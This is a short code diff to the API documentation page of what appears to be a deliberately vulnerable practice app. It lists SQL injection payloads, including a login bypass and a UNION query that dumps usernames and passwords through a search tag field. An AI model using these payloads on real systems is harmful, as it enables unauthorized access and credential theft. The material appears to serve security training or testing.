@@ -956,8 +956,8 @@ function renderApiDocs(app) {
 LoginRequest.password = "anything"
 # SQL: SELECT * FROM users WHERE username = 'admin'--' AND ...</pre>
 
-    <h3>[2] SQLi — UNION Dump (search)</h3>
-    <pre>SearchRequest.query = "x' UNION SELECT id,username,password,4,email,bio,tags,1,'','','now' FROM users--"
+    <h3>[2] SQLi — UNION Dump (tag)</h3>
+    <pre>SearchRequest.tag = "x%' UNION SELECT id,username,password,4,email,bio,tags,1,'','','now' FROM users--"
 # searchResult.posts[*].title = usernames, .body = passwords
 # searchResult.debug = raw SQL echoed back to client</pre>
 
